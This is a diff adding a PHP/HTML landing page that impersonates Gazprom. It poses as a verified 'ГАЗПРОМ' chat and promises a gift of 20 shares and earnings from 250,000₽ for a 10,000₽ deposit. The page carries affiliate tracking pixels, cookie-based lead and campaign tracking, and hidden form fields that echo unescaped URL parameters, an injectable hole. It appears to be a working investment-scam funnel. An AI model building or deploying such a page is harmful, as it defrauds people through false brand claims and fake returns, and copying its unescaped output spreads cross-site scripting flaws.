@@ -1,0 +1,371 @@
+<?php
+if (!isset($rawClick) && !isset($click)) {
+  die();
+}
+?>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>ГАЗПРОМ ДОХОД</title>
+    <link type="image/x-icon" rel="shortcut icon" href="images/logo.jpg" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="./styles/main.css" />
+    <link rel="stylesheet" href="./styles/form.css" />
+
+    <script src="form/js/libs/intlTelInput.js"></script>
+
+    <script>
+      let scriptLoadings = false;
+      // Функция для получения значения параметра из URL
+      function getUrlParam(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name);
+      }
+
+      // Проверяем наличие параметров
+      const bgeValue = getUrlParam("bge");
+      const crmSource = getUrlParam("crm_source");
+
+      if (bgeValue) {
+        // Если есть только bgeValue – подключаем скрипты для bge
+        let inlineScript = document.createElement("script");
+        inlineScript.innerHTML = `
+    window.bgdataLayer = window.bgdataLayer || [];
+    function bge() { bgdataLayer.push(arguments); }
+    bge('init', '${bgeValue}');
+  `;
+        document.head.appendChild(inlineScript);
+
+        // Подключаем второй скрипт для bge
+        let asyncScript = document.createElement("script");
+        asyncScript.src =
+          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
+        document.head.appendChild(asyncScript);
+
+        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
+        asyncScript.onload = function () {
+          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
+          console.log("Все скрипты для BGE загружены!");
+        };
+      } else if (!crmSource) {
+        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
+        let trackScript = document.createElement("script");
+        trackScript.type = "application/javascript";
+        trackScript.src = "track.js?v=21238";
+        document.head.appendChild(trackScript);
+
+        trackScript.onload = function () {
+          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
+          console.log("track.js загружен!");
+          window.removeEventListener("beforeunload", trackClose);
+        };
+
+        let inlineScript = document.createElement("script");
+        inlineScript.innerHTML = `
+    function getCookie(name) {
+      let matches = document.cookie.match(
+        new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
+      );
+      return matches ? decodeURIComponent(matches[1]) : undefined;
+    }
+
+    const subid_1 = getCookie("_subid");
+
+    var offerData = {
+      subid: subid_1,
+      buyer: "{buyer}",
+      crm_campaign: "{crm_campaign}",
+      thank_you_page: "{thank_you_page}",
+      landing_name: "offer_id_" + "{offer_id}",
+      app_key: "{app_key}",
+      bge: "{bge}",
+      ts_id: "{ts_id}",
+      info: "{info}"
+    };
+  `;
+        document.head.appendChild(inlineScript);
+
+        inlineScript.onload = function () {
+          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
+          console.log("Inline script для альтернативы загружен!");
+        };
+
+        let parseScript = document.createElement("script");
+        parseScript.type = "application/javascript";
+        parseScript.src = "parse_url.js?v=19";
+        document.head.appendChild(parseScript);
+
+        scriptLoadings = true;
+
+        parseScript.onload = function () {
+          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
+          console.log("parse_url.js загружен!");
+        };
+      }
+    </script>
+
+    <script type="application/javascript">
+      function getCookie(name) {
+        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
+        return v ? v[2] : null;
+      }
+
+      function setCookie(name, value, days) {
+        var d = new Date();
+        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
+        document.cookie =
+          name + "=" + value + ";path=/;expires=" + d.toGMTString();
+      }
+
+      function getSubId() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!"{subid}".match("{")) {
+          return "{subid}";
+        }
+        var clientSubid =
+          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
+        if (!clientSubid.match(">")) {
+          return clientSubid;
+        }
+        if (params.get("_subid")) {
+          return params.get("_subid");
+        }
+        if (params.get("subid")) {
+          return params.get("subid");
+        }
+        if (getCookie("subid")) {
+          return getCookie("subid");
+        }
+      }
+
+      function getToken() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!"{token}".match("{")) {
+          return "{token}";
+        }
+        var clientToken =
+          '<?php echo isset($client) ? $client->getToken() : "" ?>';
+        if (!clientToken.match(">")) {
+          return clientToken;
+        }
+        if (params.get("_token")) {
+          return params.get("_token");
+        }
+        if (params.get("token")) {
+          return params.get("token");
+        }
+        if (getCookie("token")) {
+          return getCookie("token");
+        }
+        return null;
+      }
+
+      function getPixel() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!"{pixel}".match("{")) {
+          return "{pixel}";
+        }
+        if (params.get("pixel")) {
+          return params.get("pixel");
+        }
+
+        if (getCookie("pixel")) {
+          return getCookie("pixel");
+        }
+
+        return null;
+      }
+
+      if (typeof URLSearchParams === "function") {
+        document.addEventListener("DOMContentLoaded", function (event) {
+          var params = new URLSearchParams(document.location.search.substr(1));
+          var subid = getSubId();
+          var token = getToken();
+          var pixel = getPixel();
+
+          params.set("_token", token);
+          setCookie("pixel", pixel);
+          setCookie("token", token);
+          setCookie("subid", subid);
+        });
+      }
+    </script>
+  </head>
+
+  <body>
+    <div class="pageloader d-none"></div>
+    <div class="main-bg">
+      <div class="pattern-bg">
+        <div class="header">
+          <div class="header__row">
+            <img class="header__left" src="./images/back.svg" alt="" />
+            <div class="header__center">
+              <img class="header__logo-icon" src="./images/logo.jpg" alt="" />
+              <div class="header__info">
+                <p class="header__logo-title">ГАЗПРОМ</p>
+                <p class="header__text-online">в сети</p>
+              </div>
+              <img
+                class="header__icon-verified"
+                src="./images/verified.svg"
+                alt=""
+              />
+            </div>
+            <img class="header__right" src="./images/phone.svg" alt="" />
+          </div>
+        </div>
+        <div class="main-chat">
+          <div class="date">Сегодня</div>
+        </div>
+        <form
+          class="form _main-form contact-form freg thin rounded hidden"
+          id="main-form"
+          method="post"
+        >
+          <div class="text-block-6"></div>
+          <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
+          <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
+          <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
+          type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
+          type="hidden" id="source" value='<?= $_GET['source'] ?>'>
+        </form>
+        <div class="footer d-none">
+          <div class="footer__wrapper">
+            <input
+              class="footer__input"
+              type="text"
+              placeholder="Введите текст"
+              required
+            />
+            <p class="field__error"></p>
+            <button class="footer__btn" type="button">
+              <img src="./images/send.svg" alt="send img" />
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="modal-1" class="modal">
+      <div class="modal__blur-bg"></div>
+      <div class="modal__header">
+        <img src="./images/logo_first.svg" alt="Logo" />
+        <img src="./images/rf.svg" alt="Logo" />
+      </div>
+      <div class="modal__content">
+        <span class="modal__heading">Добрый день!</span>
+        <p class="modal__descr">
+          ГазпромИнвест подготовил для Вас подарок В виде 20 акций
+        </p>
+        <span class="modal__heading bottom">Подарок</span>
+        <button type="button" class="modal__button" id="modal-1-btn">
+          Узнать детали
+        </button>
+        <img src="./images/gift.png" alt="Image" class="modal__image" />
+      </div>
+    </div>
+
+    <div id="modal-2" class="modal hidden">
+      <div class="modal__blur-bg"></div>
+      <div class="modal__header">
+        <img src="./images/logo_first.svg" alt="Logo" />
+        <img src="./images/rf.svg" alt="Logo" />
+      </div>
+      <div class="modal__content second">
+        <p class="modal__descr">Зарабатывайте вместе с ГазпромИнвест</p>
+        <span class="modal__heading">от 250 000₽</span>
+        <img
+          src="./images/modal_second.png"
+          alt="Image"
+          class="modal__image second"
+        />
+        <div class="modal__list">
+          <span class="modal__item">Минимальный вклад от - 10 000₽</span>
+          <span class="modal__item"
+            >Станьте микроинвестором и успейте забрать как можно больше в
+            ГазпромИнвест
+          </span>
+          <span class="modal__item"
+            >Получите бесплатный доступ к доходу до конца дня</span
+          >
+        </div>
+        <button type="button" class="modal__button" id="modal-2-btn">
+          Продолжить
+        </button>
+      </div>
+    </div>
+
+    <script src="./js/chat.js"></script>
+
+    <script src="loadAssets.js?v=321"></script>
+
+    <script>
+      window.onload = function () {
+        var err = localStorage.getItem("unsuitable");
+        var thx = localStorage.getItem("thanks");
+        if (err && err === "false") {
+          const fileErr = "err.html";
+          window.location.href = `${fileErr}${window.location.search}`;
+        } else if (thx && thx === "true") {
+          const fileThx = "thanks2.php";
+          window.location.href = `${fileThx}${window.location.search}`;
+        }
+      };
+
+      window.onpageshow = function () {
+        var err = localStorage.getItem("unsuitable");
+        var thx = localStorage.getItem("thanks");
+        if (err && err === "false") {
+          const fileErr = "err.html";
+          window.location.href = `${fileErr}${window.location.search}`;
+        } else if (thx && thx === "true") {
+          const fileThx = "thanks2.php";
+          window.location.href = `${fileThx}${window.location.search}`;
+        }
+      };
+    </script>
+
+    <script type="application/javascript">
+      function getSubId() {
+        if (!"{subid}".match("{")) {
+          localStorage.setItem("subid", "{subid}");
+          return "{subid}";
+        }
+      }
+      getSubId();
+    </script>
+    <script>
+      // Scroll to element
+      const scrollToElement = (elSelector, triggerSelector) => {
+        const el = document.querySelector(elSelector);
+        const triggers = document.querySelectorAll(triggerSelector);
+
+        const callback = (item) => {
+          item.addEventListener("click", (event) => {
+            event.preventDefault();
+
+            el.scrollIntoView({
+              behavior: "smooth",
+              block: "center",
+            });
+          });
+        };
+
+        triggers.forEach(callback);
+      };
+
+      scrollToElement("#main-form", 'a[href="#main-form"]');
+    </script>
+  </body>
+</html>
